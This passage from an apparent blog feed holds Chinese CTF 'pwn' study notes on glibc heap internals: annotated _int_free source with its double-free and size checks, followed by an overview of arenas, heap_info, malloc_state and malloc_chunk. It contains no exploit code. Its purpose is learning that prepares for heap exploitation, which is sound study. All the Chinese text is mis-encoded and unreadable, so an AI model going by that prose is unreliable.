class="comment">//æ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„å¤§å°ï¼Œä¸èƒ½å°äº2*SIZEï¼Œä¹Ÿä¸èƒ½å¤§äºav-&gt;system_mem</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//é‡Šæ”¾ä¹‹å‰å°†user dataéƒ¨åˆ†å¡«å……ä¸º perturb byte</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"><span class="comment">//åœ¨avä¸­è®¾ç½®ä½ï¼Œè¡¨ç¤ºfast binä¸­æœ‰ free chunk</span></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"><span class="comment">//é€šè¿‡åŸå­æ“ä½œå°†pæ’å…¥fast bin</span></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>)) <span class="comment">//ç®€å•æ£€æŸ¥ï¼Œfast binä¸­çš„ç¬¬ä¸€ä¸ªchunk æ˜¯ä¸æ˜¯åˆšåˆšçš„chunkï¼Œé˜²æ­¢doubble free</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">  old2 = old;</span><br><span class="line">  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">   <span class="comment">//å†æ¬¡æ£€æŸ¥ï¼Œfast bin</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¦‚æœè¯¥ chunk å¹¶é mmap () ç”Ÿæˆçš„ï¼Œå°±éœ€è¦è¿›è¡Œåˆå¹¶ï¼Œè¿‡ç¨‹å¦‚å‰é¢æ‰€è®²ï¼Œå…ˆå‘ååˆå¹¶ï¼Œå†å‘å‰åˆå¹¶ã€‚å¦‚æœåˆå¹¶ä¹‹åçš„ chunk è¶…è¿‡äº† FASTBIN_CONSOLIDATION_THRESHOLD  ï¼Œå°±ä¼šæ•´ç† fast bin å¹¶å‘ç³»ç»Ÿè¿”è¿˜å†…å­˜ã€‚ _int_free () å‡½æ•°åˆ°æ­¤ç»“æŸã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ6ï¼‰--å †åŸºç¡€æ¦‚è¿°</title>
      <link href="/posts/cbafa55d.html"/>
      <url>/posts/cbafa55d.html</url>
      
        <content type="html"><![CDATA[<h1 id="glibcå †æ¦‚è¿°"><a class="markdownIt-Anchor" href="#glibcå †æ¦‚è¿°">#</a> glibc å †æ¦‚è¿°ï¼š</h1><h2 id="1å†…å­˜ç®¡ç†ä¸å †"><a class="markdownIt-Anchor" href="#1å†…å­˜ç®¡ç†ä¸å †">#</a> 1. å†…å­˜ç®¡ç†ä¸å †ï¼š</h2><h3 id="æ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ¦‚è¿°">#</a> æ¦‚è¿°ï¼š</h3><p>â€‹å†…å­˜ç®¡ç†æ˜¯å †è®¡ç®—æœºçš„å†…å­˜èµ„æºè¿›è¡Œç®¡ç†ï¼Œè¿™è¦æ±‚åœ¨ç¨‹åºè¯·æ±‚æ—¶èƒ½å¤ŸåŠ¨æ€åˆ†é…å†…å­˜çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶åœ¨ç¨‹åºä¸éœ€è¦æ—¶é‡Šæ”¾åˆ†é…çš„å†…å­˜ã€‚CTF ç«èµ›ä¸­å¸¸è§çš„ ptmalloc2 å°±æ˜¯ glibc å®ç°çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå®ƒç»§æ‰¿äº† dlmallocï¼Œå¹¶æä¾›äº†å¯¹å¤šçº¿ç¨‹çš„æ”¯æŒã€‚</p><p>â€‹å †æ˜¯ç¨‹åºè™šæ‹Ÿå†…å­˜ä¸­ç”±ä½åœ°å€å‘é«˜åœ°å€å¢é•¿çš„çº¿æ€§åŒºåŸŸã€‚ä¸€èˆ¬åªæœ‰å½“ç”¨æˆ·å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜æ—¶ï¼Œè¿™ç‰‡åŒºåŸŸæ‰ä¼šè¢«å†…æ ¸åˆ†é…å‡ºæ¥ï¼Œå¹¶ä¸”å¤„äºæ•ˆç‡å’Œé¡µå¯¹é½çš„è€ƒè™‘ï¼Œé€šå¸¸ä¼šåˆ†é…ç›¸å½“å¤§çš„è¿ç»­å†…å­˜ã€‚ç¨‹åºå†æ¬¡ç”³è¯·æ—¶ä¾¿ä¼šä»è¿™ç‰‡å†…å­˜ä¸­åˆ†é…ï¼Œç›´åˆ°å †ç©ºé—´ä¸èƒ½æ»¡è¶³æ—¶æ‰ä¼šå†æ¬¡å¢é•¿ã€‚å †çš„ä½ç½®ä¸€èˆ¬åœ¨ BSS æ®µé«˜åœ°å€å¤„ã€‚</p><h3 id="brkå’Œsbrk"><a class="markdownIt-Anchor" href="#brkå’Œsbrk">#</a> brk () å’Œ sbrk ()ï¼š</h3><p>â€‹å †çš„å±æ€§æ˜¯å¯è¯»å¯å†™çš„ï¼Œå¤§å°é€šè¿‡ brk () å’Œ sbrk () å‡½æ•°è¿›è¡Œæ§åˆ¶ã€‚åœ¨å †æœªåˆå§‹åŒ–æ—¶ï¼Œprogram_break æŒ‡å‘ BSS æ®µçš„æœ«å°¾ï¼Œé€šè¿‡è°ƒç”¨ brk () å’Œ sbrk () æ¥ç§»åŠ¨ program_break ä½¿å¾—å †å¢é•¿ã€‚åœ¨å †åˆå§‹åŒ–æ—¶ï¼Œå¦‚æœå¼€å¯äº† ASLRï¼Œåˆ™å †çš„èµ·å§‹åœ°å€ start_brk ä¼šåœ¨ BSS æ®µä¹‹åçš„éšæœºä½ç§»å‡ºï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ï¼Œåˆ™ start_brk ä¼šç´§æ¥ç€ BSS æ®µã€‚</p><p>â€‹ä¸¤ä¸ªå‡½æ•°ç›¸å…³å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span>* end_data_segment)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;</span><br></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/direct/44bf6e33773c4e7c83318714e950a7e5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹brk () å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨äºè®¾ç½® program_break æŒ‡å‘çš„ä½ç½®ã€‚sbrk () å‡½æ•°çš„å‚æ•° increment (å¯ä»¥æ˜¯è´Ÿå€¼) ç”¨äºä¸ program_break ç›¸åŠ æ¥è°ƒæ•´ program_break çš„å€¼ã€‚æˆåŠŸæ‰§è¡Œå brk () å‡½æ•°ä¼šè¿”å› 0 ï¼Œsbrk () å‡½æ•°ä¼šè¿”å›ä¸Šä¸€æ¬¡ program_break å€¼ï¼ˆå¯ä»¥è®¾ç½®å‚æ•° increment ä¸º 0 æ¥è·å¾—å½“å‰ program_break çš„å€¼ï¼‰ã€‚</p><h3 id="mmapå’Œunmmap"><a class="markdownIt-Anchor" href="#mmapå’Œunmmap">#</a> mmap () å’Œ unmmap ()ï¼š</h3><p>â€‹å½“ç”¨æˆ·ç”³è¯·å†…å­˜è¿‡å¤§æ—¶ï¼Œptmalloc2 ä¼šé€‰æ‹©é€šè¿‡ mmap () å‡½æ•°åˆ›å»ºåŒ¿åæ˜ å°„æ®µä¾›ç”¨æˆ·ä½¿ç”¨ï¼Œå¹¶é€šè¿‡ unmmap () å‡½æ•°å›æ”¶ã€‚</p><h3 id="glibcä¸­çš„å †"><a class="markdownIt-Anchor" href="#glibcä¸­çš„å †">#</a> glibc ä¸­çš„å †ï¼š</h3><p>â€‹é€šå¸¸æ¥è¯´ï¼Œç³»ç»Ÿä¸­çš„å †æŒ‡çš„æ˜¯ä¸»çº¿ç¨‹ä¸­ main_arena æ‰€ç®¡ç†çš„åŒºåŸŸã€‚ä½† glibc ä¼šåŒæ—¶ç»´æŒå¤šä¸ªåŒºåŸŸæ¥ä¾›å¤šçº¿ç¨‹ä½¿ç”¨ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰å±äºè‡ªå·±çš„å†…å­˜ï¼ˆæˆä¸º arenaï¼‰ï¼Œè¿™äº›è¿ç»­çš„å†…å­˜ä¹Ÿå¯ä»¥æˆä¸ºå †ã€‚</p><p>â€‹glibc çš„æƒ³æ³•æ˜¯ï¼šå½“ç”¨æˆ·ç”³è¯·å †å—æ—¶ï¼Œä»å †ä¸­æŒ‰é¡ºåºåˆ†é…å †å—äº¤ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä¿å­˜æŒ‡å‘è¿™äº›å †å—çš„æŒ‡é’ˆï¼›å½“ç”¨æˆ·é‡Šæ”¾å †å—æ—¶ï¼Œglibc ä¼šå°†é‡Šæ”¾çš„å †å—ç»„ç»‡æˆé“¾è¡¨ï¼›å½“ä¸¤å—ç›¸å †å—éƒ½ä¸ºé‡Šæ”¾çŠ¶æ€æ—¶å°†ä¹‹åˆå¹¶æˆä¸€ä¸ªæ–°çš„å †å—ï¼›ç”±æ­¤è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚ç”¨æˆ·æ­£åœ¨ä½¿ç”¨ä¸­çš„å †å—å«ä½œ allocated chunkï¼Œè¢«é‡Šæ”¾çš„å †å—å«åš free chunkï¼Œç”± free chunk ç»„æˆçš„é“¾è¡¨å« binã€‚** æˆ‘ä»¬ç§°å‘¼å½“å‰ chunk ä½åœ°å€å¤„ç›¸é‚»çš„ chunk ä¸ºä¸Šä¸€ä¸ªï¼ˆåé¢çš„ï¼‰chunkï¼Œé«˜åœ°å€ç›¸é‚»å¤„çš„ chunk ä¸ºä¸‹ä¸€ä¸ªï¼ˆå‰é¢çš„ï¼‰chunkã€‚** ä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œglibc å°†ä¸åŒå¤§å°èŒƒå›´çš„ chunk ç»„ç»‡æˆä¸åŒçš„ bin ã€‚å¦‚ fast bin ã€small bin ã€large bin ç­‰ï¼Œåœ¨è¿™äº›é“¾è¡¨ä¸­çš„ chunk åˆ†åˆ«å«ä½œ fast chunk ã€small chunk å’Œ large chunk ã€‚</p><h2 id="2é‡è¦æ¦‚å¿µå’Œç»“æ„ä½“"><a class="markdownIt-Anchor" href="#2é‡è¦æ¦‚å¿µå’Œç»“æ„ä½“">#</a> 2. é‡è¦æ¦‚å¿µå’Œç»“æ„ä½“ï¼š</h2><h3 id="arena"><a class="markdownIt-Anchor" href="#arena">#</a> arenaï¼š</h3><p>â€‹arena åŒ…å«ä¸€ç‰‡æˆ–æ•°ç‰‡è¿ç»­çš„å†…å­˜ï¼Œå †å—å°†ä¼šä»è¿™ç‰‡åŒºåŸŸåˆ’åˆ†ç»™ç”¨æˆ·ã€‚ä¸»çº¿ç¨‹çš„ arena è¢«ç§°ä¸º main_arenaï¼Œå®ƒåŒ…å« start_brk å’Œ brk ä¹‹é—´çš„è¿™ç‰‡è¿ç»­å†…å­˜ã€‚</p><p>â€‹ä¸»çº¿ç¨‹çš„ arena åªæœ‰å †ï¼Œå­çº¿ç¨‹çš„ arena å¯ä»¥æœ‰æ•°ç‰‡è¿ç»­å†…å­˜ã€‚å¦‚æœä¸»çº¿ç¨‹çš„å †å¤§å°ä¸å¤Ÿåˆ†çš„è¯å¯ä»¥é€šè¿‡ brk () è°ƒç”¨æ¥æ‰©å±•ï¼Œä½†æ˜¯å­çº¿ç¨‹åˆ†é…çš„æ˜ å°„æ®µå¤§å°æ˜¯å›ºå®šçš„ï¼Œä¸å¯ä»¥æ‰©å±•ï¼Œæ‰€ä»¥å­çº¿ç¨‹åˆ†é…å‡ºæ¥çš„ä¸€æ®µæ˜ å°„æ®µä¸å¤Ÿç”¨çš„è¯å°±éœ€è¦å†æ¬¡ä½¿ç”¨ mmap () æ¥åˆ†é…æ–°çš„å†…å­˜ã€‚</p><h3 id="heap_infoç»“æ„ä½“"><a class="markdownIt-Anchor" href="#heap_infoç»“æ„ä½“">#</a> heap_info ç»“æ„ä½“ï¼š</h3><p>â€‹å¦‚ä¹‹å‰æ‰€è¯´ï¼Œå­çº¿ç¨‹çš„ arena å¯ä»¥æœ‰å¤šç‰‡è¿ç»­å†…å­˜ï¼Œè¿™äº›å†…å­˜è¢«ç§°ä¸º heapã€‚æ¯ä¸€ä¸ª heap éƒ½æœ‰è‡ªå·±çš„ heap header ã€‚å…¶å®šä¹‰å¦‚ä¸‹ï¼Œheap header æ˜¯é€šè¿‡é“¾è¡¨ç›¸è¿æ¥çš„ï¼Œå¹¶ä¸” heap header é‡Œé¢ä¿å­˜äº†æŒ‡å‘å…¶ä»–æ‰€å±çš„ arena çš„æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                              PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h3 id="malloc_stateç»“æ„ä½“"><a class="markdownIt-Anchor" href="#malloc_stateç»“æ„ä½“">#</a> malloc_state ç»“æ„ä½“ï¼š</h3><p>â€‹æ¯ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ª arena headerï¼Œé‡Œé¢ä¿å­˜äº† binã€top chunk ç­‰ä¿¡æ¯ã€‚ä¸»çº¿ç¨‹çš„ main_arena <span class="exturl" data-url="aHR0cDovL3huLS1saWJjLXA2NmZpMDBibmxoLnNv">ä¿å­˜åœ¨ libc.so</span> çš„æ•°æ®æ®µé‡Œï¼Œå…¶ä»–çº¿ç¨‹çš„ arena åˆ™ä¿å­˜åœ¨ç»™è¯¥ arena åˆ†é…çš„ heap é‡Œé¢ã€‚malloc_state å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc_chunkç»“æ„ä½“"><a class="markdownIt-Anchor" href="#malloc_chunkç»“æ„ä½“">#</a> malloc_chunk ç»“æ„ä½“ï¼š</h3><p>â€‹chunk æ˜¯ glibc ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½ï¼Œæ•´ä¸ªå †åœ¨åˆå§‹åŒ–åä¼šè¢«å½“æˆä¸€ä¸ª free  chunkï¼Œç§°ä¹‹ä¸º top chunk ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚å†…å­˜æ—¶ï¼Œå¦‚æœ bins ä¸­æ²¡æœ‰åˆé€‚çš„ chunk ï¼Œmalloc å°±ä¼šä» top chunk ä¸­è¿›è¡Œåˆ’åˆ†ï¼Œå¦‚æœ top chunk çš„å¤§å°ä¸å¤Ÿï¼Œåˆ™è°ƒç”¨ brk () æ‰©å±•å †çš„å¤§å°ï¼Œç„¶åä»æ–°ç”Ÿæˆçš„ top chunk ä¸­è¿›è¡Œåˆ‡åˆ†ã€‚ç”¨æˆ·é‡Šæ”¾å†…å­˜æ—¶ï¼Œglibc ä¼šå…ˆæ ¹æ®æƒ…å†µå°†é‡Šæ”¾çš„ chunk ä¸å…¶ä»–ç›¸é‚»çš„ free chunk åˆå¹¶ï¼Œç„¶ååŠ å…¥åˆé€‚çš„ bin ä¸­ã€‚</p><p>â€‹ä¸‹å›¾å±•ç¤ºäº†å †å—ç”³è¯·å’Œé‡Šæ”¾çš„è¿‡ç¨‹ã€‚é¦–å…ˆï¼Œç”¨æˆ·è¿ç»­ç”³è¯·äº†ä¸‰ä¸ªå †å— Aã€Bã€Cï¼Œæ­¤æ—¶é‡Šæ”¾ chunk B ï¼Œç”±äºå®ƒä¸ top chunk ä¸ç›¸é‚»ï¼Œæ‰€ä»¥ä¼šè¢«æ”¾å…¥ bin ä¸­ï¼Œæˆä¸ºä¸€ä¸ª free chunkã€‚ç°åœ¨å†æ¬¡ç”³è¯·ä¸€ä¸ªä¸ B ç›¸åŒå¤§å°çš„å †å—ï¼Œåˆ™ malloc å°†ä» bin ä¸­å–å‡º chunk B ï¼Œå›åˆ°ä¸€å¼€å§‹çš„çŠ¶æ€ï¼Œbin çš„è¡¨å¤´ä¹Ÿä¼šæŒ‡å‘ nullã€‚ã€‚ä½†å¦‚æœç”¨æˆ·è¿ç»­é‡Šæ”¾ chunk A å’Œ chunk B ï¼Œç”±äºä»–ä»¬ç›¸é‚»ä¸”éƒ½æ˜¯ free chunk ï¼Œé‚£ä¹ˆå°±ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªå¤§çš„ chunk æ”¾å…¥ bin ä¸­ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/01387fb92db746dc8ec05b89342e1ee2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¯¹ä»¥ä¸ŠçŸ¥è¯†æœ‰äº†ç®€å•çš„å°è±¡ä¹‹åï¼Œå°±å¯ä»¥çœ‹çœ‹ chunk çš„ä¿¡æ¯æ˜¯æ€ä¹ˆè¢« glibc è®°å½•çš„ï¼Œä¸‹é¢æ˜¯ malloc chunk çš„ç»“æ„ä½“å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span 